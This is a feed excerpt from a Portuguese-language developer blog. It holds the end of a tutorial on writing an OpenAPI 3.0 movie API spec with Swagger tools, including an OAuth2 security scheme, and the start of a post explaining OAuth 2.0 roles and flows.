&lt;p&gt;Com o &lt;code&gt;post:&lt;/code&gt;, temos a necessidade do uso de uma nova propriedade chamada &lt;a href="https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.1.md#requestBodyObject" title="Veja mais na spec"&gt;&lt;em&gt;requestBody&lt;/em&gt;&lt;/a&gt;. É com ela que descreveremos quais parâmetros o usuário precisará passar para criar um filme. Já o &lt;code&gt;responses&lt;/code&gt; descreve o retorno de um &lt;code&gt;201&lt;/code&gt; (created), com o recém criado filme como um &lt;em&gt;JSON&lt;/em&gt; como conteúdo da resposta.&lt;/p&gt;
&lt;p&gt;Opa! Temos um problema aqui! Nosso tipo &lt;code&gt;Movie&lt;/code&gt; tem um campo &lt;code&gt;id&lt;/code&gt; que é obrigatório por padrão. Esse campo não deveria ser enviado pelo cliente. Precisamos corrigir esse comportamento:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;paths&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;/movies&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

        &lt;span class="l l-Scalar l-Scalar-Plain"&gt;post&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Add a new movie to the set&lt;/span&gt;
          &lt;span class="nt"&gt;requestBody&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;
            &lt;span class="nt"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
              &lt;span class="nt"&gt;application/json&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="nt"&gt;schema&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                  &lt;span class="nt"&gt;$ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;#/components/schemas/NewMovie&amp;#39;&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

&lt;span class="nt"&gt;components&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;schemas&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;Movie&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;allOf&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;$ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;#/components/schemas/NewMovie&amp;#39;&lt;/span&gt;
        &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;id&lt;/span&gt;
          &lt;span class="nt"&gt;properties&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
              &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
    &lt;span class="nt"&gt;NewMovie&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;properties&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
        &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
      &lt;span class="nt"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;title&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com o uso do tipo &lt;code&gt;NewMovie&lt;/code&gt;, o &lt;em&gt;request&lt;/em&gt; feito pelo usuário está descrito da maneira correta (sem &lt;code&gt;id&lt;/code&gt;). Note que em &lt;code&gt;components&lt;/code&gt; aproveitamos todas as características de &lt;code&gt;NewMovie&lt;/code&gt;, e adicionamos uma nova (ter &lt;code&gt;id&lt;/code&gt;) para o tipo &lt;code&gt;Movie&lt;/code&gt;. Isso tudo graças ao &lt;code&gt;$ref&lt;/code&gt; e ao &lt;a href="https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.1.md#composition-and-inheritance-polymorphism" title="Leia mais na spec"&gt;&lt;em&gt;allOf&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/swagger-editor-example-3.png" width="640" height="370" title="Editor Swagger exibindo a documentação dos endpoints" alt="Editor Swagger exibindo a documentação dos endpoints"&gt;&lt;/p&gt;
&lt;p&gt;A essa altura, descrever os demais métodos e &lt;em&gt;endpoints&lt;/em&gt; não será nenhum mistério. Portanto, vamos dar um "fast forward".&lt;/p&gt;
&lt;h2&gt;Segurança&lt;/h2&gt;
&lt;p&gt;Segurança é importante, e tão importante quanto é deixar explícito para os desenvolvedores e usuários quais protocolos de autenticação/autorização que estão sendo praticados pela &lt;em&gt;API&lt;/em&gt;. No nosso caso, vamos descrever o uso do protocolo &lt;a href="https://klauslaube.com.br/2018/02/06/oauth20-autorizacao-simples-or-is-it.html" title="Leia mais sobre OAuth 2.0"&gt;&lt;em&gt;OAuth 2.0&lt;/em&gt;&lt;/a&gt;, com o &lt;code&gt;grant type&lt;/code&gt; &lt;code&gt;password&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;components&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;securitySchemes&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;OAuth2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;oauth2&lt;/span&gt;
      &lt;span class="nt"&gt;flows&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;tokenUrl&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;https://example.com/oauth/token&lt;/span&gt;
          &lt;span class="nt"&gt;scopes&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Grants read access&lt;/span&gt;
            &lt;span class="nt"&gt;write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Grants write access&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Falta anotar a propriedade &lt;code&gt;security&lt;/code&gt; em cada &lt;em&gt;endpoint&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;paths&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;/movies&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;A set of movies&lt;/span&gt;
    &lt;span class="nt"&gt;get&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Get a list of movies&lt;/span&gt;
      &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;
      &lt;span class="nt"&gt;security&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;OAuth2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;read&lt;/span&gt;
    &lt;span class="nt"&gt;post&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Add a new movie to the set&lt;/span&gt;
      &lt;span class="nt"&gt;requestBody&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;
      &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;
      &lt;span class="nt"&gt;security&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;OAuth2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;write&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Um ícone de cadeado deve ter aparecido no &lt;em&gt;preview&lt;/em&gt; do &lt;em&gt;Swagger Editor&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Outras ferramentas Swagger&lt;/h2&gt;
&lt;p&gt;Com a especificação acima temos o suficiente para publicar a documentação da nossa &lt;em&gt;API&lt;/em&gt;, e até mesmo gerar algum código &lt;em&gt;client&lt;/em&gt;. O &lt;em&gt;Swagger Editor&lt;/em&gt; quebrou um grande galho, auxiliando na escrita do documento, e é altamente recomendável o seu uso.&lt;/p&gt;
&lt;p&gt;Um &lt;em&gt;disclaimer&lt;/em&gt; especial vai para a versão do &lt;em&gt;OpenAPI Spec&lt;/em&gt; que usamos nos exemplos. Infelizmente, nem toda ferramenta suporta a versão mais recente da especificação, logo, você terá que usar versões mais antigas caso queira utilizar as demais ferramentas que o &lt;em&gt;Swagger&lt;/em&gt; disponibiliza.&lt;/p&gt;
&lt;h3&gt;Gerando código com o &lt;em&gt;Codegen&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;O &lt;a href="https://github.com/swagger-api/swagger-codegen" title="Veja o repositório no Github"&gt;&lt;em&gt;Swagger Code Generator&lt;/em&gt;&lt;/a&gt; é um projeto super bacana que interpreta a especificação e gera código para diferentes linguagens. Infelizmente, a versão estável do &lt;em&gt;swagger-codegen&lt;/em&gt; só suporta até a versão &lt;code&gt;2.0&lt;/code&gt; do &lt;em&gt;OpenAPI Spec&lt;/em&gt;, e o &lt;em&gt;snapshot&lt;/em&gt; mais recente ainda não possui uma gama grande de linguagens disponíveis.&lt;/p&gt;
&lt;p&gt;Construir &lt;em&gt;SDKs&lt;/em&gt; nunca foi tão fácil:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;java -jar ~/Downloads/swagger-codegen-cli-3.0.0-20180314.142155-42.jar generate &lt;span class="se"&gt;\&lt;/span&gt;
    -i ~/Downloads/openapi.yaml &lt;span class="se"&gt;\&lt;/span&gt;
    -l java -o ~/Projects/java/mini-imdb
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se você quer usufruir dessa ferramenta, é recomendado que utilize as versões do &lt;em&gt;OpenAPI Spec&lt;/em&gt; descritas no repositório do projeto: &lt;a href="https://github.com/swagger-api/swagger-codegen#compatibility" title="Veja a grade de compatibilidade do codegen"&gt;https://github.com/swagger-api/swagger-codegen#compatibility&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/swagger-api/swagger-codegen/wiki/api-client-generator-howto" title="Veja mais no Wiki do projeto"&gt;API client generator HOWTO&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Gerando documentação com o &lt;em&gt;UI&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;Com o &lt;a href="https://github.com/swagger-api/swagger-ui" title="Veja o repositório no Gihub"&gt;&lt;em&gt;Swagger UI&lt;/em&gt;&lt;/a&gt;, a partir da especificação recém criada, podemos gerar documentações elegantes e acessíveis ao nosso usuário final. O projeto é em &lt;em&gt;NodeJS&lt;/em&gt;, e necessita de algum "Javascript-fu" para executá-lo.&lt;/p&gt;
&lt;p&gt;A maneira mais fácil de usá-lo é através da plataforma &lt;a href="https://swaggerhub.com/" title="The Platform for Designing and Documenting APIs with Swagger"&gt;&lt;em&gt;SwaggerHub&lt;/em&gt;&lt;/a&gt;. Onde você pode criar um usuário gratuitamente e ter 1 (um) projeto publicado no plano &lt;em&gt;free&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/swagger-ui-example.png" width="640" height="375" title="Exemplo Swagger UI" alt="Exemplo Swagger UI"&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://app.swaggerhub.com/apis/kplaube/movies-api/v1" title="Veja no SwaggerHub"&gt;Confira o exemplo no &lt;em&gt;SwaggerHub&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Vale notar que a documentação é "viva", ou seja, ela interage com os endpoints do seu serviço. Para que esse recurso funcione corretamente, você precisa anotar a propriedade &lt;code&gt;servers&lt;/code&gt; na especificação da &lt;em&gt;API&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.1.md#serverObject" title="Veja na documentação oficial"&gt;Leia mais sobre &lt;em&gt;Server Object&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Testando com &lt;em&gt;Inspector&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;Se você já usou o &lt;a href="https://insomnia.rest/" title="Debug APIs like a human, not a robot"&gt;&lt;em&gt;Insomnia&lt;/em&gt;&lt;/a&gt; ou &lt;a href="https://www.getpostman.com/" title="Postman Makes API Development Simple"&gt;&lt;em&gt;Postman&lt;/em&gt;&lt;/a&gt;, vai se sentir em casa com o &lt;a href="https://inspector.swagger.io/builder" title="Veja a aplicação"&gt;&lt;em&gt;Swagger Inspector&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Inspector&lt;/em&gt; é uma &lt;em&gt;GUI&lt;/em&gt; que auxilia nos testes de &lt;em&gt;endpoints&lt;/em&gt; &lt;em&gt;REST&lt;/em&gt;. Com ele, fica mais fácil inspecionar &lt;em&gt;endpoints&lt;/em&gt; e validar o contrato e comportamento dos mesmos.&lt;/p&gt;
&lt;p&gt;Confesso que acho o &lt;em&gt;Postman&lt;/em&gt; muito mais eficiente nesse quesito. Mas infelizmente, o aplicativo só suporta até a versão &lt;code&gt;2.0&lt;/code&gt; do &lt;em&gt;Swagger Spec&lt;/em&gt;. Nada que impeça que você configure os &lt;em&gt;requests&lt;/em&gt; para os &lt;em&gt;endpoints&lt;/em&gt; manualmente.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;A &lt;em&gt;spec&lt;/em&gt; final você encontra &lt;a href="https://gist.github.com/kplaube/509c52f13dc966c915600733db60c2bb" title="Veja o exemplo completo"&gt;aqui&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;O ambiente em torno do &lt;em&gt;OpenAPI&lt;/em&gt; é rico, e vale a pena considerar escrever suas próximas especificações de &lt;em&gt;APIs&lt;/em&gt; com esse padrão. Se você, assim como eu, vem de outros formatos (como o &lt;em&gt;RAML&lt;/em&gt; ou &lt;em&gt;JSON Schema&lt;/em&gt;), não notará grande diferença na forma de escrita com o &lt;em&gt;OAI&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É claro que não é só o pessoal do &lt;em&gt;Swagger&lt;/em&gt; que cria ferramentas para &lt;em&gt;Swagger Spec&lt;/em&gt; e &lt;em&gt;OpenAPI Spec&lt;/em&gt;. Você pode conferir as diversas ferramentas criadas pela comunidade em &lt;a href="https://swagger.io/open-source-integrations/#community-driven-language-integrations-2" title="Veja mais em swagger.io"&gt;&lt;em&gt;Tools and Integrations&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Sem dúvida, falaremos sobre &lt;em&gt;Python&lt;/em&gt; + &lt;em&gt;Swagger&lt;/em&gt; nos próximos &lt;em&gt;posts&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até lá.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="rest"></category><category term="microservices"></category><category term="apis"></category><category term="swagger"></category><category term="oai"></category></entry><entry><title>OAuth2.0: Autorização simples (or is it?)</title><link href="https://klauslaube.com.br/2018/02/06/oauth20-autorizacao-simples-or-is-it.html" rel="alternate"></link><published>2018-02-06T11:45:00-02:00</published><updated>2018-02-06T11:45:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2018-02-06:/2018/02/06/oauth20-autorizacao-simples-or-is-it.html</id><summary type="html">&lt;p&gt;É isso mesmo, meu caro leitor! Já pincelamos alguns assuntos que cerceiam o desenvolvimento
de &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre API"&gt;&lt;em&gt;APIs&lt;/em&gt;&lt;/a&gt;, desde
&lt;a href="https://klauslaube.com.br/2017/01/06/construindo-apis-em-django-com-restless.html" title="Construindo APIs em Django com Restless"&gt;bibliotecas&lt;/a&gt;
até a construção de &lt;a href="https://klauslaube.com.br/2017/01/31/ramilificando-as-suas-apis.html" title="Ramilificando as suas APIs"&gt;especificações&lt;/a&gt;.
Nesse &lt;em&gt;post&lt;/em&gt; vamos introduzir a camada de &lt;em&gt;auth&lt;/em&gt; de uma &lt;em&gt;API&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, e
entender como podemos resolver esse problema através do protocolo &lt;em&gt;OAuth 2.0&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;O que …&lt;/h2&gt;</summary><content type="html">&lt;p&gt;É isso mesmo, meu caro leitor! Já pincelamos alguns assuntos que cerceiam o desenvolvimento
de &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre API"&gt;&lt;em&gt;APIs&lt;/em&gt;&lt;/a&gt;, desde
&lt;a href="https://klauslaube.com.br/2017/01/06/construindo-apis-em-django-com-restless.html" title="Construindo APIs em Django com Restless"&gt;bibliotecas&lt;/a&gt;
até a construção de &lt;a href="https://klauslaube.com.br/2017/01/31/ramilificando-as-suas-apis.html" title="Ramilificando as suas APIs"&gt;especificações&lt;/a&gt;.
Nesse &lt;em&gt;post&lt;/em&gt; vamos introduzir a camada de &lt;em&gt;auth&lt;/em&gt; de uma &lt;em&gt;API&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, e
entender como podemos resolver esse problema através do protocolo &lt;em&gt;OAuth 2.0&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;O que é OAuth 2.0?&lt;/h2&gt;
&lt;p&gt;Diretamente do &lt;a href="https://oauth.net/2/" title="Leia mais sobre OAuth"&gt;oauth2.net&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OAuth 2.0 is the industry-standard protocol for authorization. OAuth 2.0 supersedes
the work done on the original OAuth protocol created in 2006. OAuth 2.0 focuses on client
developer simplicity while providing specific authorization flows for web applications,
desktop applications, mobile phones, and living room devices.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em outras palavras, é um &lt;em&gt;framework&lt;/em&gt; de autorização que possibilita aplicações a obterem acesso limitado
a contas de usuários em um serviço &lt;a href="https://klauslaube.com.br/tag/http.html" title="Leia mais sobre HTTP"&gt;&lt;em&gt;HTTP&lt;/em&gt;&lt;/a&gt;, como &lt;em&gt;Facebook&lt;/em&gt;, &lt;em&gt;GitHub&lt;/em&gt;
ou &lt;em&gt;Twitter&lt;/em&gt;. Ele funciona delegando a autenticação do usuário ao serviço que "hosteia" a sua conta,
e autoriza aplicações &lt;em&gt;third-party&lt;/em&gt; a acessarem a mesma.&lt;/p&gt;
&lt;p&gt;Imagine que você criou um serviço &lt;em&gt;web&lt;/em&gt;. É razoável assumir que você aplique alguma forma proprietária para
resolver a questão de autenticação de usuários. Um formulário com &lt;em&gt;username&lt;/em&gt; e &lt;em&gt;password&lt;/em&gt; seria o suficiente
para realizar a tarefa. Imagine que o seu serviço comece a ganhar notoriedade, e com isso potenciais parceiros
desejam se integrar com a sua solução. Construir uma &lt;a href="https://klauslaube.com.br/tag/rest.html" title="Leia mais sobre REST"&gt;&lt;em&gt;API REST&lt;/em&gt;&lt;/a&gt; é um
caminho confortável, uma vez que o padrão é aberto, bem explorado, e não há nenhuma restrição de patente ou direitos
para que o seu parceiro o adote.&lt;/p&gt;
&lt;p&gt;O mesmo acontece com o &lt;em&gt;OAuth&lt;/em&gt;. Agora você precisa autorizar o acesso a sua &lt;em&gt;API&lt;/em&gt;, afinal não é todo parceiro que terá
acesso a parte &lt;em&gt;premium&lt;/em&gt; da sua solução. Ao invés de bolar um fluxo proprietário, no qual o seu parceiro terá que
desenvolver uma biblioteca apenas para conectar-se ao seu serviço, você adota o &lt;em&gt;OAuth 2.0&lt;/em&gt;. Como é um padrão aberto,
o interessado provavelmente já o conhece e já possui as ferramentas necessárias.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/oauth-let-me-in.jpg" width="640" height="427" title="O OAuth 2.0 é comprovadamente seguro. Mas nem tanto contra vampiros... (amazon.com)" alt="O OAuth 2.0 é comprovadamente seguro. Mas nem tanto contra vampiros... (amazon.com)"&gt;&lt;/p&gt;
&lt;p&gt;Embora pareça complicado, é possível resumir o fluxo do &lt;em&gt;OAuth 2.0&lt;/em&gt; com o diagrama abaixo:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/oauth-overview.png" width="640" height="359" title="Diagrama exibindo a dança realizada para autorizar um usuário (api.slack.com)" alt="Diagrama exibindo a dança realizada para autorizar um usuário (api.slack.com)"&gt;&lt;/p&gt;
&lt;p&gt;Entender melhor os papéis envolvidos nesse processo pode dar mais cor ao entendimento do diagrama acima.&lt;/p&gt;
&lt;h2&gt;Papéis&lt;/h2&gt;
&lt;p&gt;O protocolo &lt;em&gt;OAuth&lt;/em&gt; faz uso de 4 papéis:&lt;/p&gt;
&lt;h3&gt;Resource owner (user)&lt;/h3&gt;
&lt;p&gt;O &lt;em&gt;resource owner&lt;/em&gt; é o usuário que autoriza a aplicação a acessar a sua conta.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Exemplo:&lt;/strong&gt; Você.&lt;/p&gt;
&lt;h3&gt;Client (application)&lt;/h3&gt;
&lt;p&gt;A aplicação que está tentando acessar a conta do usuário. O usuário precisa autorizá-la a fazê-lo.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Exemplo:&lt;/strong&gt; Um aplicativo de galeria de imagens que conecta-se ao seu &lt;em&gt;Dropbox&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Authorization server&lt;/h3&gt;
&lt;p&gt;Esse é o servidor que apresenta a interface onde o usuário pode aprovar ou negar o acesso daquele aplicativo
à sua conta.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Exemplo:&lt;/strong&gt; Servidor de autorização do &lt;em&gt;Dropbox&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Resource server (API)&lt;/h3&gt;
&lt;p&gt;É o serviço/&lt;em&gt;API&lt;/em&gt; no qual estamos tentando acessar. O &lt;em&gt;resource server&lt;/em&gt; lida com requisições autenticadas
após o aplicativo ter obtido um &lt;em&gt;token&lt;/em&gt; de acesso.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Exemplo:&lt;/strong&gt; &lt;em&gt;API&lt;/em&gt; de arquivos do &lt;em&gt;Dropbox&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;No cenário descrito acima, ter o &lt;em&gt;authorization server&lt;/em&gt; e o &lt;em&gt;resource server&lt;/em&gt; no mesmo serviço é aceitável.
Mas podemos ter a necessidade de apenas autenticar o usuário (utilizando o &lt;em&gt;Facebook&lt;/em&gt; como &lt;em&gt;authorization server&lt;/em&gt;,
por exemplo) e prover funcionalidades da nossa própria &lt;em&gt;API&lt;/em&gt; (agindo como &lt;em&gt;resource server&lt;/em&gt;).&lt;/p&gt;
&lt;h2&gt;Fluxos&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/oauth2-diagram-dropbox.png" width="640" height="622" title="Diagrama de autorização de usuário no Dropbox (dropbox.com)" alt="Diagrama de autorização de usuário no Dropbox (dropbox.com)"&gt;&lt;/p&gt;
&lt;p&gt;Você provavelmente já passou pelo fluxo ilustrado acima ao fazer &lt;em&gt;login&lt;/em&gt; no &lt;em&gt;Spotify&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;app&lt;/em&gt; do &lt;em&gt;Spotify&lt;/em&gt; pede autorização ao &lt;em&gt;Facebook&lt;/em&gt; para acessar os dados da sua conta.
O &lt;em&gt;Facebook&lt;/em&gt; por sua vez exibe uma tela, solicitando que você autorize o acesso clicando em um botão.
Com isso, &lt;em&gt;Facebook&lt;/em&gt; autoriza acesso do &lt;em&gt;Spotify&lt;/em&gt; e a partir daí ele é capaz de ver o seu endereço
de e-mail e consequentemente ter certeza de que "você é você".&lt;/p&gt;
&lt;p&gt;No caso do exemplo da galeria de fotos, os seguintes passos são executados:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A aplicação requisita autorização para acessar os recursos do usuário;&lt;/li&gt;
&lt;li&gt;Se o usuário autorizá-la, a aplicação recebe um &lt;em&gt;authorization grant&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;A aplicação requisita um &lt;em&gt;access token&lt;/em&gt; do &lt;em&gt;authorization server&lt;/em&gt;, apresentando as suas próprias credenciais e o &lt;em&gt;authorization grant&lt;/em&gt; cedido pelo usuário;&lt;/li&gt;
&lt;li&gt;Se as credenciais e o &lt;em&gt;authorization grant&lt;/em&gt; forem válidos, o &lt;em&gt;authorization server&lt;/em&gt; emite um &lt;em&gt;access token&lt;/em&gt; para a aplicação. O processo de autorização está completo;&lt;/li&gt;
&lt;li&gt;A aplicação requisita o recurso protegido do &lt;em&gt;resource server&lt;/em&gt;, apresentando o &lt;em&gt;access token&lt;/em&gt; para autenticação;&lt;/li&gt;
&lt;li&gt;Se o &lt;em&gt;access token&lt;/em&gt; for válido, o &lt;em&gt;resource server&lt;/em&gt; retorna o recurso para a aplicação.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Caso você esteja construindo o aplicativo de galeria de fotos, é necessário criar um "app" na área de &lt;em&gt;Developers&lt;/em&gt; do &lt;em&gt;Dropbox&lt;/em&gt;, como mostrado abaixo:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/dropbox-app-creation.png" width="640" height="522" title="Área de criação de app" alt="Área de criação de app"&gt;&lt;/p&gt;
&lt;p&gt;Ao finalizar o cadastro, o &lt;em&gt;app&lt;/em&gt; receberá um &lt;code&gt;app key&lt;/code&gt; e &lt;code&gt;app secret&lt;/code&gt;. Essas são as credenciais do aplicativo, que
devem ser apresentadas ao &lt;em&gt;authorization server&lt;/em&gt; juntamente com o &lt;code&gt;authorization grant&lt;/code&gt;, para que o processo execute com sucesso.&lt;/p&gt;
